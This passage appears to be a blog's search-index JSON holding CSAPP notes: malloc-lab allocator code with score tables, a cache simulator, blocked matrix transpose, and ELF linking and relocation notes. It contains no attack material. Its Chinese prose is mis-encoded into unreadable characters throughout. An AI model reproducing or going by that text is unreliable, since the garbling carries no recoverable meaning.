fitä¾æ®2çš„æ¬¡å¹‚åˆ†ä¸º16ä¸ªç»„ï¼š{1}ï¼Œ{2}ï¼Œ{3ï¼Œ4}ï¼Œ{5~8}ï¼Œâ€¦ï¼Œ{1025~2048}ï¼Œ{2049~4096}â€¦ ä¿®æ”¹å®å®šä¹‰ï¼š #define MAX_FREE_LIST 16 static void* free_listp[MAX_FREE_LIST]; static void insert_freelist(void* bp,size_t size); first_fit static void *first_fit(size_t asize) { int index=free_index(asize); void *bp=NULL; while(index\u003cMAX_FREE_LIST) { bp=free_listp[index]; while((bp!=NULL)\u0026\u0026(asize\u003eGET_SIZE(HDRP(bp)))) { bp = GET_PREV(bp); } if(bp!=NULL) return bp; index++; } return NULL; } free_index static int free_index(size_t size) { int index=0; while ((index\u003cMAX_FREE_LIST-1)) { if(size\u003e1) { size\u003e\u003e=1; index++; } else break; } return index; } æ­¤ç‰ˆå¾—åˆ†ï¼š trace valid util ops secs Kops 0 yes 98% 5694 0.000244 23307 1 yes 97% 5848 0.000362 16168 2 yes 96% 6648 0.000287 23156 3 yes 98% 5380 0.000518 10386 4 yes 100% 14400 0.000306 47105 5 yes 93% 4800 0.000338 14189 6 yes 90% 4800 0.000517 9283 7 yes 55% 12000 0.000311 38598 8 yes 51% 24000 0.000735 32666 9 yes 28% 14401 0.058034 248 10 yes 28% 14401 0.002643 5448 Total 76% 112372 0.064295 1748 Perf index = 46 (util) + 40 (thru) = 86/100 ","date":"2021-02-21","objectID":"/csapp-malloclab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#æ”¹è¿›åˆ†ç¦»é“¾è¡¨first-fit"},{"categories":["Pwning"],"content":"æ”¹è¿›ï¼šreallocåœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œreallocéƒ½ä¾èµ–äº†mallocå’Œfreeå‡½æ•°ï¼Œå®ç°å¾ˆæš´åŠ›ã€‚åœ¨æ”¹è¿›ä¸­ï¼Œè‹¥å½“å‰å—çš„åä¸€ä¸ªå—æ˜¯freeä¸”ç›¸åŠ åçš„å¤§å°æ»¡è¶³éœ€æ±‚å°±å¯ä»¥è¿›è¡Œåˆå¹¶ã€‚ void *mm_realloc(void *ptr, size_t size) { void *new_ptr; size_t asize; if(ptr==NULL){ new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; return new_ptr; } if(size==0){ mm_free(ptr); return NULL; } if(size \u003c= DSIZE) asize = 2*DSIZE; else asize = ALIGN(size + DSIZE); size_t oldsize=GET_SIZE(HDRP(ptr)); if(asize\u003c=oldsize){ place(ptr,asize); return ptr; } else{ size_t next_alloc=GET_ALLOC(HDRP(NEXT_BLKP(ptr))); size_t new_size; new_size=GET_SIZE(HDRP(NEXT_BLKP(ptr)))+oldsize; if(!next_alloc\u0026\u0026(asize\u003c=new_size)) //next is free { remove_freelist(NEXT_BLKP(ptr)); PUT(HDRP(ptr), PACK(new_size, 1)); PUT(FTRP(ptr), PACK(new_size, 1)); return ptr; } else { new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; memcpy(new_ptr, ptr, size-WSIZE); mm_free(ptr); return new_ptr; } } } è¿™é‡Œæˆ‘è®¤ä¸ºåˆå¹¶åå¯ä»¥å†æ¬¡ç»†åŒ–è¿›è¡Œåˆ†å‰²ï¼Œä½†æ˜¯åˆ†å‰²ååˆ†æ•°åè€Œä½äº†ï¼ˆé»‘äººï¼Ÿï¼Ÿï¼Ÿ.jpgï¼‰ Results for mm malloc: trace valid util ops secs Kops 0 yes 98% 5694 0.000216 26361 1 yes 97% 5848 0.000214 27340 2 yes 96% 6648 0.000308 21556 3 yes 98% 5380 0.000197 27365 4 yes 100% 14400 0.000250 57554 5 yes 93% 4800 0.000344 13970 6 yes 90% 4800 0.000310 15469 7 yes 55% 12000 0.000334 35907 8 yes 51% 24000 0.000761 31521 9 yes 99% 14401 0.000260 55367 10 yes 57% 14401 0.000234 61464 Total 85% 112372 0.003429 32771 Perf index = 51 (util) + 40 (thru) = 91/100 ç›®å‰åˆ†æ•°æœ€é«˜çš„ä¸€ç‰ˆã€‚ ","date":"2021-02-21","objectID":"/csapp-malloclab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#æ”¹è¿›realloc"},{"categories":["Pwning"],"content":"CSAPP-Cachelab","date":"2021-02-14","objectID":"/csapp-cachelab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Cachelab","uri":"/csapp-cachelab/#csapp-cachelab"},{"categories":["Pwning"],"content":"part Aæ¨¡æ‹Ÿcache #include \"cachelab.h\"#include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cgetopt.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003climits.h\u003e #define BUFFER_SIZE 50 char buf[BUFFER_SIZE]; int s; int E; int b; char *t; int cache_size; long long *cache; unsigned time_stamp; unsigned *last_used_time; int hit_count; int miss_count; int eviction_count; void memoryAccess(long long addr) { ++time_stamp; int set_idx = (addr \u003e\u003e b) \u0026 ((1 \u003c\u003c s) - 1); long long tag = addr \u003e\u003e (b + s); long long *set_cache = cache + set_idx * E; unsigned *set_used_time = last_used_time + set_idx * E; int i; unsigned LRU_i = -1; unsigned LRU_valid; unsigned LRU_time; for (i = 0; i \u003c E; ++i) { unsigned valid = set_cache[i] \u0026 1; long long tag_i = set_cache[i] \u003e\u003e 1; if (valid \u003e 0 \u0026\u0026 tag == tag_i) { ++hit_count; set_used_time[i] = time_stamp; return ; } else { if (LRU_i == -1 || valid \u003c LRU_valid || (valid == LRU_valid\u0026\u0026 set_used_time[i] \u003c LRU_time)) { LRU_i = i; LRU_valid = valid; LRU_time = set_used_time[i]; } } } ++miss_count; eviction_count += LRU_valid; set_used_time[LRU_i] = time_stamp; set_cache[LRU_i] = tag \u003c\u003c 1 | 1; } int main(int argc, char *argv[]) { char *optString = \"s:E:b:t:\"; int opt = getopt(argc, argv, optString); while (~opt) { switch (opt) { case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': t = optarg; break; } opt = getopt(argc, argv, optString); } time_stamp = 0; hit_count = miss_count = eviction_count = 0; cache_size = E \u003c\u003c s; cache = (long long *) malloc(sizeof(*cache) * cache_size); last_used_time = (unsigned *) malloc(sizeof(*last_used_time) * cache_size); memset(cache, 0, sizeof(*cache) * cache_size); FILE *fp = fopen(t, \"r\"); while (fgets(buf, BUFFER_SIZE, fp) != NULL) { int len = strlen(buf); if (len \u003c= 2 || buf[0] != ' ') continue; char op = buf[1]; if (!(op == 'L' || op == 'S' || op == 'M')) continue; int i; for (i = 0; i \u003c len; ++i) if (buf[i] == ',') { buf[i] = '\\0'; break; } buf[1] = '0', buf[2] = 'x'; long long addr; sscanf(buf + 1, \"%llx\", \u0026addr); printf(\"op = %c, addr = %llx, \", op, addr); memoryAccess(addr); if (op == 'M') ++hit_count; } printSummary(hit_count, miss_count, eviction_count); fclose(fp); return 0; } ","date":"2021-02-14","objectID":"/csapp-cachelab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Cachelab","uri":"/csapp-cachelab/#part-a"},{"categories":["Pwning"],"content":"part Bè¦æ±‚å®ç°æ•°ç»„è½¬ç½®ï¼Œå¹¶ä¸”æœ‰é™åˆ¶ï¼š ç¼“å­˜å‚æ•°ä¸ºï¼šs = 5, E = 1, b = 5ã€‚ æœ€å¤šèƒ½å¤Ÿå®šä¹‰ 12 ä¸ª int ç±»å‹çš„å±€éƒ¨å˜é‡ã€‚ ä¸å…è®¸ä¿®æ”¹çŸ©é˜µ Aï¼Œä½†èƒ½ä»»æ„ä¿®æ”¹çŸ©é˜µ Bã€‚ ç”±å°±ç¡¬åˆ†å—ï¼Œåˆ†å…«å—ï¼ŒåŠ ä¸Šä¸€äº›å˜é‡èƒ½æœ€å¤§åˆ©ç”¨å±€éƒ¨å˜é‡ã€‚32*32çš„çŸ©é˜µåˆ†å…«å—ï¼Œå°†å…«å—å…¨éƒ¨è¯»å…¥å†å†™ã€‚64*64çŸ©é˜µå…ˆåˆ†å…«å—ï¼Œå†å››å—ã€‚61*67åˆ†16å—ã€‚ 64*64ç”¨äº†åˆ†å—çŸ©é˜µè½¬ç½®çš„çŸ¥è¯† $$ \\begin{Bmatrix} A_{11} \u0026 A_{12} \\ A_{21} \u0026 A_{22} \\end{Bmatrix} = \\begin{Bmatrix} A^T_{11} \u0026 A^T_{21} \\ A^T_{12} \u0026 A^T_{22} \\end{Bmatrix} $$ å°†å…¶åˆ†ä¸º32*32çš„å››å—ï¼Œå­çŸ©é˜µåˆ†å…«å—è½¬ç½®ï¼Œå†åˆ†å››å—äº¤æ¢å¯¹è§’çº¿å­çŸ©é˜µã€‚ void transpose_submit(int M, int N, int A[N][M], int B[M][N]) { int i, j, k, h; int a1, a2, a3, a4, a5, a6, a7, a8; if(N==32) { for (i = 0; i \u003c N; i+=8) { for (j = 0; j \u003c M; j+=8) { for(k=i; k\u003ci+8; ++k) { a1 = A[k][j]; a2 = A[k][j+1]; a3 = A[k][j+2]; a4 = A[k][j+3]; a5 = A[k][j+4]; a6 = A[k][j+5]; a7 = A[k][j+6]; a8 = A[k][j+7]; B[j][k] = a1; B[j+1][k] = a2; B[j+2][k] = a3; B[j+3][k] = a4; B[j+4][k] = a5; B[j+5][k] = a6; B[j+6][k] = a7; B[j+7][k] = a8; } } } } else if(N==64) { for(i=0; i\u003cN; i+=8) { for(j=0; j\u003cM; j+=8) { for(k=j; k\u003cj+4; ++k) { a1=A[k][i]; a2=A[k][i+1]; a3=A[k][i+2]; a4=A[k][i+3]; a5=A[k][i+4]; a6=A[k][i+5]; a7=A[k][i+6]; a8=A[k][i+7]; B[i][k]=a1; B[i][k+4]=a5; B[i+1][k]=a2; B[i+1][k+4]=a6; B[i+2][k]=a3; B[i+2][k+4]=a7; B[i+3][k]=a4; B[i+3][k+4]=a8; } for(k=i; k\u003ci+4; ++k) { a1=B[k][j+4]; a2=B[k][j+5]; a3=B[k][j+6]; a4=B[k][j+7]; a5=A[j+4][k]; a6=A[j+5][k]; a7=A[j+6][k]; a8=A[j+7][k]; B[k][j+4]=a5; B[k][j+5]=a6; B[k][j+6]=a7; B[k][j+7]=a8; B[k+4][j]=a1; B[k+4][j+1]=a2; B[k+4][j+2]=a3; B[k+4][j+3]=a4; } for(k=i+4; k\u003ci+8; ++k) { a1=A[j+4][k]; a2=A[j+5][k]; a3=A[j+6][k]; a4=A[j+7][k]; B[k][j+4]=a1; B[k][j+5]=a2; B[k][j+6]=a3; B[k][j+7]=a4; } } } } else if(M==61) { for(i=0; i\u003cN; i+=16) { for(j=0; j\u003cM; j+=16) { for(k=i; k\u003ci+16\u0026\u0026k\u003cN; ++k) { for(h=j; h\u003cj+16\u0026\u0026h\u003cM; ++h) { B[h][k] = A[k][h]; } } } } } } ","date":"2021-02-14","objectID":"/csapp-cachelab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Cachelab","uri":"/csapp-cachelab/#part-b"},{"categories":["Pwning"],"content":"Lecture 08: Linkingå’Œå­¦è¿‡çš„pwnçš„ä¸€éƒ¨åˆ†é‡åˆäº†ï¼Œæ‰€ä»¥åªè®°å½•æ–°çš„çŸ¥è¯†ã€‚ ","date":"2021-02-14","objectID":"/csapp-lecture-08/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#lecture-08-linking"},{"categories":["Pwning"],"content":"ç¬¦å·å’Œç¬¦å·è¡¨ç¬¦å·è¡¨.symtabä¸­çš„æ¯ä¸ªæ¡ç›®å…·æœ‰ä»¥ä¸‹æ ¼å¼ï¼š typedef strcut{ int name; char type:4, binding:4; char reserved; short section; long value; long size; }Elf64_Symbol; **nameï¼š**ä¿å­˜ç¬¦å·çš„åå­—ï¼Œæ˜¯.strtabçš„å­—èŠ‚åç§»é‡ **typeï¼š**è¯´æ˜è¯¥ç¬¦å·çš„ç±»å‹ï¼Œæ˜¯å‡½æ•°ã€å˜é‡è¿˜æ˜¯æ•°æ®èŠ‚ç­‰ç­‰ **bindingï¼š**è¯´æ˜è¯¥ç¬¦å·æ˜¯å±€éƒ¨è¿˜æ˜¯å…¨å±€çš„ **valueï¼š**å¯¹äºå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶è€Œè¨€ï¼Œæ˜¯å®šä¹‰è¯¥ç¬¦å·çš„èŠ‚åˆ°è¯¥ç¬¦å·çš„åç§»é‡ï¼ˆæ¯”å¦‚å‡½æ•°å°±æ˜¯åœ¨.textä¸­ï¼Œåˆå§‹åŒ–çš„å˜é‡åœ¨.dataï¼Œæœªåˆå§‹åŒ–çš„å˜é‡åœ¨.bssä¸­ï¼‰ï¼›å¯¹äºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶è€Œè¨€ï¼Œæ˜¯ç»å¯¹è¿è¡Œå½¢å¼åœ°å€ã€‚ **sizeï¼š**æ˜¯ç¬¦å·çš„å€¼çš„å­—èŠ‚æ•°ç›®ã€‚ï¼ˆé€šè¿‡valueå’Œsizeå°±èƒ½è·å¾—è¯¥ç¬¦å·çš„å€¼ï¼‰ **sectionï¼š**è¯´æ˜è¯¥ç¬¦å·ä¿å­˜åœ¨å“ªä¸ªèŠ‚ä¸­ï¼Œæ˜¯èŠ‚å¤´éƒ¨è¡¨ä¸­çš„åç§»é‡ã€‚ å¯¹äºåƒLinux LDè¿™æ ·çš„é™æ€é“¾æ¥å™¨ï¼ˆStatic Linkerï¼‰ï¼Œæ˜¯ä»¥ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤å‚æ•°ä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„ã€å¯ä»¥åŠ è½½å’Œè¿è¡Œçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å‡ºã€‚ä¸ºäº†æ„é€ å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œé“¾æ¥å™¨æœ‰ä¸¤ä¸ªä»»åŠ¡ï¼š **ç¬¦å·è§£æï¼ˆSymbol Resolutionï¼‰ï¼š**å°†æ¯ä¸ªç¬¦å·å¼•ç”¨å’Œä¸€ä¸ªç¬¦å·å®šä¹‰å…³è”èµ·æ¥ **é‡å®šä½ï¼ˆRelocationï¼‰ï¼šç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆä»åœ°å€0å¼€å§‹çš„ä»£ç å’Œæ•°æ®èŠ‚ï¼Œé“¾æ¥å™¨ä¼šå¯¹ä»£ç ã€æ•°æ®èŠ‚ã€ç¬¦å·åˆ†é…å†…å­˜åœ°å€ï¼Œç„¶åä½¿ç”¨æ±‡ç¼–å™¨äº§ç”Ÿçš„é‡å®šä½æ¡ç›®ï¼ˆRelocation Entryï¼‰**çš„æŒ‡ä»¤ï¼Œä¿®æ”¹æ‰€æœ‰å¯¹è¿™äº›ç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘æ­£ç¡®çš„å†…å­˜ä½ç½®ã€‚ ","date":"2021-02-14","objectID":"/csapp-lecture-08/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#ç¬¦å·å’Œç¬¦å·è¡¨"},{"categories":["Pwning"],"content":"ç¬¦å·è§£æé“¾æ¥å™¨ç¬¦å·è§£ææ˜¯å°†æ¯ä¸ªç¬¦å·å¼•ç”¨ä¸è¾“å…¥çš„æ‰€æœ‰å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚ ç¼–è¯‘å™¨ä¼šå‘æ±‡ç¼–å™¨è¾“å‡ºæ¯ä¸ªå…¨å±€ç¬¦å·æ˜¯å¼ºï¼ˆStrongï¼‰è¿˜æ˜¯å¼±ï¼ˆWeakï¼‰ï¼Œè€Œæ±‡ç¼–å™¨ä¼šæŠŠè¿™äº›ä¿¡æ¯éšå¼ç¼–ç åœ¨å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­ã€‚å‡½æ•°å’Œå·²åˆå§‹åŒ–çš„å…¨å±€ç¬¦å·æ˜¯å¼ºç¬¦å·ï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€ç¬¦å·æ˜¯å¼±ç¬¦å·ã€‚ ç„¶åé“¾æ¥å™¨é€šè¿‡ä»¥ä¸‹è§„åˆ™æ¥å¤„ç†åœ¨å¤šä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­é‡å¤å®šä¹‰çš„å…¨å±€ç¬¦å·ï¼š ä¸å…è®¸æœ‰å¤šä¸ªåŒåçš„å¼ºç¬¦å·ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™é“¾æ¥å™¨ä¼šæŠ¥é”™ å¦‚æœæœ‰ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·åŒåï¼Œåˆ™ç¬¦å·é€‰æ‹©å¼ºç¬¦å·çš„å®šä¹‰ å¦‚æœæœ‰å¤šä¸ªå¼±ç¬¦å·åŒåï¼Œç¬¦å·å°±éšæœºé€‰æ‹©ä¸€ä¸ªå¼±ç¬¦å·çš„å®šä¹‰ å…³äºè¿™éƒ¨åˆ†ï¼Œä¹¦ä¸Šä¸¾äº†å¾ˆå¤šä¾‹å­ä¾¿äºç†è§£ã€‚ åˆ¤æ–­ç¬¦å·é‡‡ç”¨å“ªç§å®šä¹‰ï¼š åœ¨å„ä¸ªæ–‡ä»¶ä¸­ç¡®å®šåŒåå…¨å±€ç¬¦å·çš„å¼ºå¼±ï¼Œå…¶ä¸­ç¬¦å·å’Œåˆå§‹åŒ–çš„å…¨å±€ç¬¦å·ä¸ºå¼ºç¬¦å·ï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€ç¬¦å·ä¸ºå¼±ç¬¦å· ","date":"2021-02-14","objectID":"/csapp-lecture-08/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#ç¬¦å·è§£æ"},{"categories":["Pwning"],"content":"é™æ€åº“çš„é“¾æ¥ä¸è§£æå¼•ç”¨åœ¨ç¬¦å·è§£æé˜¶æ®µï¼Œé“¾æ¥å™¨ä¼šç»´æŠ¤ä¸€ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„é›†åˆEï¼Œä¸€ä¸ªå¼•ç”¨äº†ä½†æ˜¯è¿˜æœªå®šä¹‰çš„ç¬¦å·é›†åˆUï¼Œä¸€ä¸ªå‰é¢è¾“å…¥æ–‡ä»¶ä¸­å·²ç»å®šä¹‰çš„ç¬¦å·é›†åˆDï¼Œç„¶ååœ¨å‘½ä»¤è¡Œä¸­ä»å·¦åˆ°å³ä¾æ¬¡æ‰«æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå­˜æ¡£æ–‡ä»¶ï¼š å¦‚æœè¾“å…¥æ–‡ä»¶æ˜¯å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œé“¾æ¥å™¨å°±å°†å…¶æ·»åŠ åˆ°Eä¸­ï¼Œç„¶åæ ¹æ®è¯¥æ–‡ä»¶çš„ç¬¦å·è¡¨æ¥ä¿®æ”¹Uå’ŒDï¼Œç„¶åç»§ç»­ä¸‹ä¸€ä¸ªè¾“å…¥æ–‡ä»¶ã€‚ å¦‚æœè¾“å…¥æ–‡ä»¶æ˜¯å­˜æ¡£æ–‡ä»¶ï¼Œåˆ™é“¾æ¥å™¨ä¼šä¾æ¬¡æ‰«æå­˜æ¡£æ–‡ä»¶ä¸­çš„æˆå‘˜mï¼Œå¦‚æœmå®šä¹‰äº†Uä¸­çš„ä¸€ä¸ªç¬¦å·ï¼Œåˆ™å°†mæ·»åŠ åˆ°Eä¸­ï¼Œç„¶åæ ¹æ®mçš„ç¬¦å·è¡¨æ¥ä¿®æ”¹Uå’ŒDã€‚æœ€åæ²¡æœ‰åŒ…å«åœ¨Eä¸­çš„æˆå‘˜å°±ä¼šè¢«ä¸¢å¼ƒï¼Œç„¶åç»§ç»­ä¸‹ä¸€ä¸ªè¾“å…¥æ–‡ä»¶ã€‚ å¦‚æœé“¾æ¥å™¨æ‰«æå®Œæ¯•ï¼ŒUä¸­è¿˜å­˜åœ¨æ²¡æœ‰ç¡®å®šå®šä¹‰çš„ç¬¦å·ï¼Œåˆ™é“¾æ¥å™¨ä¼šæŠ¥é”™å¹¶ç»ˆæ­¢ï¼Œå¦åˆ™é“¾æ¥å™¨ä¼šåˆå¹¶å’Œé‡å®šä½Eä¸­çš„ç›®æ ‡æ–‡ä»¶ï¼Œå¾—åˆ°å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚ æ ¹æ®ä»¥ä¸Šè¿‡ç¨‹çš„æè¿°ï¼Œæˆ‘ä»¬éœ€è¦å°å¿ƒå‘½ä»¤è¡Œä¸Šåº“å’Œç›®æ ‡æ–‡ä»¶çš„é¡ºåºï¼Œè¦ä¿è¯å‰é¢è¾“å…¥æ–‡ä»¶ä¸­æœªè§£æçš„ç¬¦å·èƒ½åœ¨åç»­è¾“å…¥æ–‡ä»¶ä¸­è¿›è¡Œè§£æï¼Œå¦åˆ™ä¼šå‡ºç°é“¾æ¥é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯å°†åº“æ”¾åœ¨åé¢ï¼Œå¦‚æœåº“ä¹‹é—´å­˜åœ¨ä¾èµ–ï¼Œä¹Ÿè¦æ³¨æ„åº“ä¹‹é—´çš„é¡ºåºï¼Œå¹¶ä¸”ä¸ºäº†æ»¡è¶³ä¾èµ–å…³ç³»ï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸Šé‡å¤åº“ã€‚ ","date":"2021-02-14","objectID":"/csapp-lecture-08/:2:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#é™æ€åº“çš„é“¾æ¥ä¸è§£æå¼•ç”¨"},{"categories":["Pwning"],"content":"é‡å®šä½å½“é“¾æ¥å™¨å®Œæˆç¬¦å·è§£ææ—¶ï¼Œå°±èƒ½ç¡®å®šåœ¨å¤šä¸ªç›®æ ‡æ–‡ä»¶ä¸­é‡å®šä¹‰çš„å…¨å±€ç¬¦å·çš„è§£æï¼Œä»¥åŠè·å¾—é™æ€åº“ä¸­éœ€è¦çš„ç›®æ ‡æ¨¡å—ï¼Œæ­¤æ—¶æ‰€æœ‰ç¬¦å·å¼•ç”¨éƒ½èƒ½å’Œä¸€ä¸ªç¬¦å·å®šä¹‰å…³è”èµ·æ¥äº†ã€‚æ­¤æ—¶å¼€å§‹é‡å®šä½æ­¥éª¤ï¼ŒåŒ…æ‹¬ï¼š é“¾æ¥å™¨å°†æ‰€æœ‰ç›®æ ‡æ¨¡å—ä¸­ç›¸åŒç±»å‹çš„èŠ‚åˆå¹¶æˆåŒä¸€ç±»å‹çš„æ–°çš„èšåˆèŠ‚ï¼Œæ¯”å¦‚å°†æ‰€æœ‰è¾“å…¥ç›®æ ‡æ¨¡å—çš„.dataèŠ‚èšåˆæˆå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„.dataèŠ‚ï¼Œå…¶ä»–èŠ‚ä¹Ÿå¦‚æ­¤æ“ä½œã€‚ æ­¤æ—¶é“¾æ¥å™¨çŸ¥é“ä»£ç èŠ‚å’Œæ•°æ®èŠ‚çš„ç¡®åˆ‡å¤§å°ï¼Œå°±å°†è¿è¡Œæ—¶å†…å­˜åœ°å€èµ‹ç»™æ–°çš„èšåˆèŠ‚ï¼Œä»¥åŠè¾“å…¥æ¨¡å—å®šä¹‰çš„æ¯ä¸ªç¬¦å·ã€‚æ­¤æ—¶ç¨‹åºçš„æ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶å†…å­˜åœ°å€äº†ã€‚ è®°å¾—ä¹‹å‰å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œç”±äºç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨å¹¶ä¸çŸ¥é“ç¬¦å·çš„è¿è¡Œæ—¶å†…å­˜åœ°å€ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸€ä¸ªå ä½ç¬¦æ¥è®¾ç½®ç¬¦å·å¼•ç”¨çš„åœ°å€ï¼Œè€Œå½“å‰é“¾æ¥å™¨å·²ä¸ºç¬¦å·åˆ†é…äº†å†…å­˜åœ°å€ï¼Œæ‰€ä»¥é“¾æ¥å™¨éœ€è¦ä¿®æ”¹ä»£ç èŠ‚å’Œæ•°æ®èŠ‚ä¸­å¯¹æ¯ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å®ƒä»¬æŒ‡å‘æ­£ç¡®çš„è¿è¡Œæ—¶å†…å­˜åœ°å€ã€‚ å½“æ±‡ç¼–å™¨ç”Ÿæˆç›®æ ‡æ¨¡å—æ—¶ï¼Œå®ƒæ— æ³•ç¡®å®šæ•°æ®å’Œä»£ç æœ€ç»ˆä¼šæ”¾åœ¨å†…å­˜çš„ä»€ä¹ˆä½ç½®ï¼Œä¹Ÿæ— æ³•ç¡®å®šè¯¥æ¨¡å—å¼•ç”¨å¤–éƒ¨å®šä¹‰çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä½ç½®ï¼Œæ‰€ä»¥æ±‡ç¼–å™¨å…ˆç”¨å ä½ç¬¦æ¥å é¢†ä½ç½®ï¼Œç„¶åå¯¹åœ°å€æœªçŸ¥çš„ç¬¦å·äº§ç”Ÿä¸€ä¸ªé‡å®šä½æ¡ç›®ï¼ˆRelocation Entryï¼‰ï¼Œä»£ç çš„é‡å®šä½æ¡ç›®ä¼šä¿å­˜åœ¨.rel.textèŠ‚ä¸­ï¼Œå·²åˆå§‹åŒ–æ•°æ®çš„é‡å®šä½æ¡ç›®ä¼šä¿å­˜åœ¨rel.data.èŠ‚ä¸­ã€‚ typedef struct{ long offset; long type:32; symbol:32; long addend; }Elf_Rela; å…¶ä¸­ï¼Œoffsetè¡¨ç¤ºè¦ä¿®æ”¹ç¬¦å·å¼•ç”¨çš„å†…å­˜åœ°å€ï¼Œtypeè¡¨ç¤ºé‡å®šä½çš„ç±»å‹ï¼Œsymbolæ˜¯ç¬¦å·è¡¨çš„ç´¢å¼•å€¼ï¼Œè¡¨ç¤ºå¼•ç”¨çš„ç¬¦å·ï¼Œå¯ä»¥é€šè¿‡è¯¥ç¬¦å·è·å¾—çœŸå®çš„å†…å­˜åœ°å€ï¼Œaddendæ˜¯ä¸€ä¸ªæœ‰ç¬¦å·å¸¸æ•°ï¼Œæœ‰äº›é‡å®šä½éœ€è¦ä½¿ç”¨è¿™ä¸ªå‚æ•°æ¥ä¿®æ”¹å¼•ç”¨ä½ç½®ã€‚ int sum(int *a, int n); int array[2] = {1, 2}; int main() { int val = sum(array, 2); return val; } æˆ‘ä»¬å¯ä»¥é€šè¿‡objdump -dx main.oæ¥å¾—åˆ°main.oçš„åæ±‡ç¼–ä»£ç ï¼Œå¯ä»¥å‘ç°è¯¥å‡½æ•°ä¸­æ— æ³•ç¡®å®šarrayå’Œå…¶ä»–ç›®æ ‡æ¨¡å—ä¸­å®šä¹‰çš„å‡½æ•°sumåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œæ‰€ä»¥ä¼šå¯¹arrayå’Œsumäº§ç”Ÿé‡å®šä½æ¡ç›® sub $0x8,%rsp mov $0x2,%esi mov $0x0,%edi a:R_X86_64_32 array callq 13\u003cmain+0x13\u003e f:R_X86_64_PC32 sum-0x4 add $0x8,%rsp retq R_X86_64_PC32 è¯¥é‡å®šä½æ¡ç›®ä¸»è¦ç”¨æ¥äº§ç”Ÿ32ä½PCç›¸å¯¹åœ°å€çš„å¼•ç”¨ï¼Œå³å‡½æ•°è°ƒç”¨æ—¶çš„é‡å®šä½ã€‚ å…¶ä¸­callæŒ‡ä»¤çš„å¼€å§‹åœ°å€å¤„äºèŠ‚åç§»0xeå¤„ï¼Œç„¶åæœ‰ä¸€ä¸ªå­—èŠ‚çš„æ“ä½œç e8ï¼Œåé¢è·Ÿç€çš„å°±æ˜¯å‡½æ•°sumçš„32ä½PCç›¸å¯¹å¼•ç”¨çš„å ä½ç¬¦ï¼Œæ‰€ä»¥é“¾æ¥å™¨ä¿®æ”¹çš„ä½ç½®åœ¨å½“å‰èŠ‚åç§»0xfå¤„ã€‚è¯¥é‡å®šä½æ¡ç›®råŒ…å«ä»¥ä¸‹å­—æ®µ r.offset = 0xf //è¯¥å€¼æ˜¯å½“å‰èŠ‚çš„åç§»é‡ï¼Œå®šä½åˆ°é‡å®šä½çš„ä½ç½® r.symbol = sum //ä¿å­˜çš„æ˜¯è¦é‡å®šä½çš„ç¬¦å· r.type = R_X86_64_PC32 //ä¿å­˜çš„æ˜¯é‡å®šä½çš„ç±»å‹ r.addend = -4 å½“å‰é“¾æ¥å™¨å·²ç»ç¡®å®šäº†å„ä¸ªèŠ‚å’Œç¬¦å·çš„çš„å†…å­˜åœ°å€ï¼Œè¯¥ä»£ç å¤„äº.textèŠ‚ä¸­ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡.textå’Œr.offsetçš„å€¼æ¥ç¡®å®šå ä½ç¬¦çš„å†…å­˜åœ°å€ ADDR(s) = ADDR(.text) = 0x4004d0 refaddr = ADDR(s) + 